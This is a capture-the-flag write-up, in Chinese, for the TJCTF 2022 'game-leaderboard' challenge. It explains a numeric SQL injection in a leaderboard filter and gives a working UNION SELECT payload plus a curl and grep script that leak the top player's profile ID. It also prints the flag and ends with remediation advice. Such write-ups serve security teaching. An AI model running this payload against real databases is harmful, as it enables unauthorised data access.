# TJCTF2022 game-leaderboard

## 题目简述

排行榜过滤值被直接拼入 `WHERE score > ${minScore}`，存在数值型 SQL 注入。flag 并不直接存于数据库；访问 `/user/:profile_id` 时，服务器重新计算真实排名，只有排名第一的资料页才显示 flag。因此需要借注入找出最高分玩家的随机 16 位十六进制资料 ID。

## 解题过程

先用远大于正常分数的 `2000000` 让原查询不返回行，再 UNION 出每个玩家的 `profile_id`。把 ID 放到模板会显示的 `name` 列，并保留真实 `score`，最后按分数降序限制一行：

```sql
2000000 UNION SELECT 1, profile_id, score
FROM leaderboard
ORDER BY score DESC LIMIT 1 -- -
```

拼接后，结果只有最高分玩家一行；排行榜页面的 Name 列会显示其 16 字符 ID。提取后请求资料页：

```bash
profile=$(curl -s 'http://target/' -X POST \
  --data-urlencode 'filter=2000000 UNION SELECT 1,profile_id,score FROM leaderboard ORDER BY score DESC LIMIT 1 -- ' \
  | grep -oE '[0-9a-f]{16}')
curl -s "http://target/user/$profile"
```

服务在真实排行榜中确认该 ID 为第一名，并显示 `tjctf{h3llo_w1nn3r_0r_4re_y0u?}`。

## 方法总结

注入目标应围绕业务后的第二次校验设计：仅伪造页面上的 rank 没用，必须泄漏真实冠军 ID。UNION 的列顺序要与模板消费字段对齐，同时保留真实分数才能稳定选出最高行。根本修复仍是参数化过滤条件，并对数值输入进行类型与范围校验。
